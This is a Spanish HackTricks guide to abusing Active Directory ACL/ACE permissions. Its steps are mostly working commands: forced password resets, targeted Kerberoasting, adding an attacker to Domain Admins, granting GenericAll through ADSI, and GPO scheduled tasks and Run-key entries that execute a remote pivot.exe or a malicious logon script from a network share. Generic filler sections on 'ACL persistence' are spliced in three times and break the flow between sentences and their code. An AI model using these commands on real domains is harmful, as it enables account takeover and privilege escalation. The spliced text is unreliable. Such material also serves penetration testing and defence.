# Abuso de ACL/ACE de Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos de amenazas proactivas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Contexto

Este laboratorio es para abusar de los permisos débiles de las Listas de Control de Acceso Discrecional (DACLs) y las Entradas de Control de Acceso (ACEs) de Active Directory que componen las DACLs.

Los objetos de Active Directory, como usuarios y grupos, son objetos segurizables y las DACL/ACEs definen quién puede leer/modificar esos objetos (es decir, cambiar el nombre de la cuenta, restablecer la contraseña, etc.).

Un ejemplo de ACEs para el objeto segurizable "Administradores de dominio" se puede ver aquí:

![](../../../.gitbook/assets/1.png)

Algunos de los permisos y tipos de objetos de Active Directory que nos interesan como atacantes son:

* **GenericAll** - derechos completos sobre el objeto (agregar usuarios a un grupo o restablecer la contraseña de un usuario)
* **GenericWrite** - actualizar los atributos del objeto (por ejemplo, el script de inicio de sesión)
* **WriteOwner** - cambiar el propietario del objeto a un usuario controlado por el atacante para tomar el control del objeto
* **WriteDACL** - modificar las ACEs del objeto y otorgar al atacante el control total sobre el objeto
* **AllExtendedRights** - capacidad de agregar usuarios a un grupo o restablecer la contraseña
* **ForceChangePassword** - capacidad de cambiar la contraseña de un usuario
* **Self (Self-Membership)** - capacidad de agregarse a uno mismo a un grupo

En este laboratorio, vamos a explorar e intentar explotar la mayoría de las ACEs mencionadas anteriormente.

Vale la pena familiarizarse con todos los [enlaces de BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) y con tantos [Derechos Extendidos](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) de Active Directory como sea posible, ya que nunca se sabe cuándo puedes encontrar uno menos común durante una evaluación.

## GenericAll en Usuario

Usando powerview, comprobemos si nuestro usuario atacante `spotless` tiene los derechos `GenericAll` en el objeto de AD para el usuario `delegate`:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
Podemos ver que de hecho nuestro usuario `spotless` tiene los derechos `GenericAll`, lo que permite al atacante tomar el control de la cuenta:

![](../../../.gitbook/assets/2.png)

*   **Cambiar contraseña**: Simplemente puedes cambiar la contraseña de ese usuario con

```bash
net user <username> <password> /domain
```
*   **Kerberoasting dirigido**: Puedes hacer que el usuario sea **kerberoastable** estableciendo un **SPN** en la cuenta, kerberoastearlo e intentar descifrarlo sin conexión:

```powershell
# Establecer SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# Obtener Hash
.\Rubeus.exe kerberoast /user:<username> /nowrap
# Limpiar SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# También puedes usar la herramienta https://github.com/ShutdownRepo/targetedKerberoast
# para obtener hashes de uno o todos los usuarios
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **ASREPRoasting dirigido**: Puedes hacer que el usuario sea **ASREPRoastable** **desactivando** la **preautenticación** y luego ASREProastearlo.

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## GenericAll en Grupo

Veamos si el grupo `Domain admins` tiene permisos débiles. Primero, obtengamos su `distinguishedName`:
```csharp
Get-NetGroup "domain admins" -FullData
```
# Abuso de Persistencia de ACL

La persistencia de ACL (Access Control List) es una técnica utilizada por los atacantes para mantener el acceso no autorizado a un sistema comprometido. Esta técnica aprovecha las reglas de control de acceso existentes en un sistema operativo para otorgar permisos adicionales a un usuario malintencionado.

## Metodología

La metodología para abusar de la persistencia de ACL en un entorno de Active Directory se puede dividir en los siguientes pasos:

1. **Recolección de información**: El primer paso es recopilar información sobre el entorno objetivo, incluyendo la estructura de Active Directory, los grupos y usuarios existentes, y los permisos asignados.

2. **Identificación de objetivos**: Una vez recopilada la información, se deben identificar los objetivos potenciales para el abuso de persistencia de ACL. Esto puede incluir grupos o usuarios con permisos elevados o sistemas críticos dentro del entorno.

3. **Análisis de permisos**: En esta etapa, se analizan los permisos existentes para identificar posibles vulnerabilidades. Esto puede incluir permisos excesivos o mal configurados que podrían ser abusados para obtener acceso persistente.

4. **Explotación de la persistencia de ACL**: Una vez identificadas las vulnerabilidades, se procede a explotarlas para obtener acceso persistente. Esto puede implicar la modificación de las ACL existentes para otorgar permisos adicionales al atacante.

5. **Mantenimiento del acceso**: Una vez que se ha obtenido acceso persistente, es importante mantenerlo de manera encubierta. Esto puede incluir la creación de reglas de ACL adicionales o la modificación de las existentes para asegurar que el acceso no sea detectado o revocado.

## Conclusiones

El abuso de persistencia de ACL es una técnica efectiva utilizada por los atacantes para mantener el acceso no autorizado en un sistema comprometido. Al comprender la metodología detrás de esta técnica, los profesionales de la seguridad pueden tomar medidas para proteger sus sistemas y prevenir posibles abusos de ACL.
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Podemos ver que nuestro usuario atacante `spotless` tiene nuevamente derechos de `GenericAll`:

![](../../../.gitbook/assets/5.png)

Esto nos permite agregar a nosotros mismos (el usuario `spotless`) al grupo `Domain Admin`:
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

Lo mismo se puede lograr con el módulo de Active Directory o PowerSploit:
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write en Computadora/Usuario

* Si tienes estos privilegios en un **objeto de Computadora**, puedes llevar a cabo [Delegación Restringida basada en Recursos de Kerberos: Toma de Control del Objeto de Computadora](../resource-based-constrained-delegation.md).
* Si tienes estos privilegios sobre un usuario, puedes utilizar uno de los [primeros métodos explicados en esta página](./#genericall-on-user).
* O, ya sea que lo tengas en una Computadora o en un usuario, puedes utilizar **Credenciales en Sombra** para suplantarlos:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty en Grupo

Si nuestro usuario controlado tiene el derecho `WriteProperty` en `Todos` los objetos para el grupo `Domain Admin`:

![](../../../.gitbook/assets/7.png)

Podemos agregar nuevamente nuestro usuario al grupo `Domain Admins` y elevar los privilegios:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## Autoasociación (Auto-Membresía) en Grupo

Otro privilegio que permite al atacante agregarse a sí mismo a un grupo:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (Auto-Membresía)

Un privilegio más que permite al atacante agregarse a un grupo:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
# Abuso de Persistencia de ACL

La persistencia de ACL (Access Control List) es una técnica utilizada por los atacantes para mantener el acceso no autorizado a un sistema comprometido. Esta técnica aprovecha las reglas de control de acceso existentes en un sistema operativo para otorgar permisos adicionales a un usuario malintencionado.

## Descripción general

El abuso de persistencia de ACL implica la modificación de las listas de control de acceso existentes en un sistema para otorgar permisos adicionales a un usuario malintencionado. Esto permite al atacante mantener el acceso al sistema incluso después de que se hayan tomado medidas para eliminar su presencia inicial.

## Metodología

La metodología para abusar de la persistencia de ACL generalmente sigue los siguientes pasos:

1. Identificar los objetos protegidos por ACL: El primer paso es identificar los objetos del sistema que están protegidos por listas de control de acceso. Estos objetos pueden incluir archivos, carpetas, claves de registro, servicios, etc.

2. Analizar las reglas de ACL existentes: Una vez identificados los objetos protegidos, se deben analizar las reglas de ACL existentes para comprender cómo se otorgan los permisos y qué usuarios o grupos tienen acceso.

3. Modificar las reglas de ACL: El siguiente paso es modificar las reglas de ACL para otorgar permisos adicionales al usuario malintencionado. Esto puede implicar agregar al usuario a un grupo con permisos elevados o modificar directamente las reglas de ACL existentes.

4. Mantener el acceso persistente: Una vez que se han modificado las reglas de ACL, el atacante puede mantener el acceso persistente al sistema. Esto puede implicar la creación de una cuenta de usuario adicional, la modificación de permisos de archivos o la creación de tareas programadas.

## Mitigación

Para mitigar el abuso de persistencia de ACL, se recomienda seguir las siguientes prácticas de seguridad:

- Limitar los privilegios de los usuarios: Es importante limitar los privilegios de los usuarios para reducir el impacto de un posible abuso de persistencia de ACL. Los usuarios solo deben tener los permisos necesarios para realizar sus tareas específicas.

- Monitorear y auditar las reglas de ACL: Es fundamental monitorear y auditar regularmente las reglas de ACL para detectar cualquier modificación no autorizada. Esto puede incluir el uso de herramientas de monitoreo de seguridad y la revisión periódica de los registros de eventos.

- Aplicar actualizaciones y parches: Mantener el sistema operativo y las aplicaciones actualizadas con los últimos parches de seguridad puede ayudar a mitigar el abuso de persistencia de ACL al corregir posibles vulnerabilidades.

- Implementar políticas de seguridad sólidas: Es importante implementar políticas de seguridad sólidas que incluyan la gestión adecuada de usuarios y grupos, la aplicación de contraseñas seguras y la configuración adecuada de las reglas de ACL.

- Realizar pruebas de penetración: Realizar pruebas de penetración regulares puede ayudar a identificar posibles vulnerabilidades en las reglas de ACL y tomar medidas correctivas antes de que sean explotadas por atacantes malintencionados.

## Conclusiones

El abuso de persistencia de ACL es una técnica utilizada por los atacantes para mantener el acceso no autorizado a un sistema comprometido. Al comprender cómo funciona esta técnica y seguir las prácticas de seguridad recomendadas, los administradores de sistemas pueden mitigar eficazmente este tipo de amenaza.
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

Si tenemos `ExtendedRight` en el tipo de objeto `User-Force-Change-Password`, podemos restablecer la contraseña del usuario sin conocer su contraseña actual:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

Haciendo lo mismo con powerview:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

Otro método que no requiere manipulación de la conversión de cadenas seguras de contraseñas:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...o una línea si no está disponible una sesión interactiva:
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

y una última forma de lograr esto desde Linux:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
Más información:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner en Grupo

Observe cómo antes del ataque, el propietario de `Domain Admins` es `Domain Admins`:

![](../../../.gitbook/assets/17.png)

Después de la enumeración ACE, si encontramos que un usuario bajo nuestro control tiene derechos de `WriteOwner` en `ObjectType:All`
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/18.png)

...podemos cambiar el propietario del objeto `Domain Admins` a nuestro usuario, que en nuestro caso es `spotless`. Ten en cuenta que el SID especificado con `-Identity` es el SID del grupo `Domain Admins`:
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## GenericWrite en Usuario

---

### Descripción

El abuso de la persistencia de ACL (Control de Lista de Acceso) es una técnica utilizada por los atacantes para mantener el acceso persistente en un entorno de Active Directory. Esta técnica aprovecha los permisos de escritura genéricos (GenericWrite) en los objetos de usuario para lograr la persistencia.

### Detalles

El permiso de escritura genérico (GenericWrite) es un permiso especial que permite a un usuario modificar atributos específicos de un objeto. En el contexto de Active Directory, este permiso se puede abusar para modificar los atributos de un objeto de usuario y otorgar al atacante privilegios adicionales.

El abuso de la persistencia de ACL mediante el permiso GenericWrite en un objeto de usuario puede permitir al atacante:

- Agregar o modificar atributos de usuario, como el campo "memberOf" para agregar al usuario a grupos de alto privilegio.
- Modificar los atributos de contraseña para establecer una contraseña persistente para el usuario.
- Modificar los atributos de inicio de sesión para permitir el inicio de sesión interactivo o remoto en el sistema.

Estos cambios permiten al atacante mantener el acceso persistente en el entorno de Active Directory y realizar actividades maliciosas sin ser detectado.

### Mitigación

Para mitigar el abuso de la persistencia de ACL mediante el permiso GenericWrite en objetos de usuario, se recomienda seguir las siguientes prácticas de seguridad:

- Limitar los permisos de escritura genéricos (GenericWrite) en los objetos de usuario solo a usuarios y grupos confiables.
- Implementar un monitoreo y registro adecuados para detectar cambios inusuales en los atributos de usuario.
- Mantener actualizado el entorno de Active Directory con los últimos parches y actualizaciones de seguridad.
- Implementar políticas de contraseñas fuertes y cambiar regularmente las contraseñas de los usuarios.

Al seguir estas prácticas de seguridad, se puede reducir el riesgo de abuso de la persistencia de ACL en un entorno de Active Directory.
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/20.png)

El permiso `WriteProperty` en un `ObjectType`, que en este caso particular es `Script-Path`, permite al atacante sobrescribir la ruta del script de inicio de sesión del usuario `delegate`, lo que significa que la próxima vez que el usuario `delegate` inicie sesión, su sistema ejecutará nuestro script malicioso:
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
A continuación se muestra cómo se actualizó el campo de script de inicio de sesión del usuario en AD:

![](../../../.gitbook/assets/21.png)

## GenericWrite en el grupo

Esto te permite establecer como miembros del grupo nuevos usuarios (por ejemplo, tú mismo):
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

Si eres el propietario de un grupo, como yo soy el propietario de un grupo AD llamado `Test`:

![](../../../.gitbook/assets/22.png)

Lo cual, por supuesto, puedes hacer a través de PowerShell:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

Y si tienes un `WriteDACL` en ese objeto de AD:

![](../../../.gitbook/assets/24.png)

...puedes otorgarte privilegios [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) con un poco de hechicería ADSI:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
Lo cual significa que ahora tienes control total sobre el objeto AD:

![](../../../.gitbook/assets/25.png)

Esto significa efectivamente que ahora puedes agregar nuevos usuarios al grupo.

Interesante destacar que no pude abusar de estos privilegios utilizando el módulo de Active Directory y los cmdlets `Set-Acl` / `Get-Acl`:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **Replicación en el dominio (DCSync)**

El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.\
[**Aprende más sobre el ataque DCSync aquí.**](../dcsync.md)

## Delegación de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

A veces, ciertos usuarios/grupos pueden tener acceso delegado para administrar los objetos de directiva de grupo, como es el caso del usuario `offense\spotless`:

![](../../../.gitbook/assets/a13.png)

Podemos ver esto aprovechando PowerView de la siguiente manera:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
El siguiente indica que el usuario `offense\spotless` tiene privilegios de **WriteProperty**, **WriteDacl**, **WriteOwner** entre otros que son propensos a ser abusados:

![](../../../.gitbook/assets/a14.png)

### Enumerar permisos de GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Sabemos que el ObjectDN anterior de la captura de pantalla se refiere al GPO `New Group Policy Object` ya que el ObjectDN apunta a `CN=Policies` y también a `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que es el mismo en la configuración del GPO como se resalta a continuación:

![](../../../.gitbook/assets/a15.png)

Si queremos buscar GPOs mal configurados específicamente, podemos encadenar múltiples cmdlets de PowerSploit de la siguiente manera:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**Computadoras con una Política Aplicada Dada**

Ahora podemos resolver los nombres de las computadoras a las que se aplica la GPO `Política Mal Configurada`:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**Políticas aplicadas a un equipo dado**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**Unidades Organizativas con una Política Aplicada Dada**
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abuso de GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

Una de las formas de abusar de esta mala configuración y lograr la ejecución de código es crear una tarea programada inmediata a través de la GPO de la siguiente manera:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

Lo anterior agregará nuestro usuario spotless al grupo local `administrators` de la máquina comprometida. Observa cómo antes de la ejecución del código, el grupo no contiene al usuario `spotless`:

![](../../../.gitbook/assets/a20.png)

### Módulo GroupPolicy **- Abuso de GPO**

{% hint style="info" %}
Puedes verificar si el módulo GroupPolicy está instalado con `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. En caso de necesidad, puedes instalarlo con `Install-WindowsFeature –Name GPMC` como administrador local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Este payload, después de que se actualice el GPO, también necesitará que alguien inicie sesión en la computadora.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**

{% hint style="info" %}
No puede crear GPO, por lo que aún debemos hacerlo con RSAT o modificar uno al que ya tengamos acceso de escritura.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Actualizar la política forzadamente <a href="#actualizar-la-política-forzadamente" id="actualizar-la-política-forzadamente"></a>

Las actualizaciones abusivas anteriores de **GPO se recargan** aproximadamente cada 90 minutos.\
Si tienes acceso a la computadora, puedes forzarla con `gpupdate /force`.

### Bajo el capó <a href="#bajo-el-capó" id="bajo-el-capó"></a>

Si observamos las Tareas Programadas de la GPO `Política mal configurada`, podemos ver nuestra `evilTask` allí:

![](../../../.gitbook/assets/a22.png)

A continuación se muestra el archivo XML que se creó con `New-GPOImmediateTask` que representa nuestra tarea programada maliciosa en la GPO:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### Usuarios y Grupos <a href="#usuarios-y-grupos" id="usuarios-y-grupos"></a>

La misma escalada de privilegios se puede lograr abusando de la función de Usuarios y Grupos de GPO. Tenga en cuenta en el archivo a continuación, en la línea 6 donde se agrega el usuario `spotless` al grupo local `administrators` - podríamos cambiar el usuario por otro, agregar otro o incluso agregar el usuario a otro grupo/múltiples grupos ya que podemos modificar el archivo de configuración de la política en la ubicación mostrada debido a la delegación de GPO asignada a nuestro usuario `spotless`:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
{% endcode %}

Además, podríamos considerar aprovechar los scripts de inicio/cierre de sesión, usar el registro para autoruns, instalar .msi, editar servicios y otras vías de ejecución de código similares.

## Referencias

* Inicialmente, esta información fue en su mayoría copiada de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

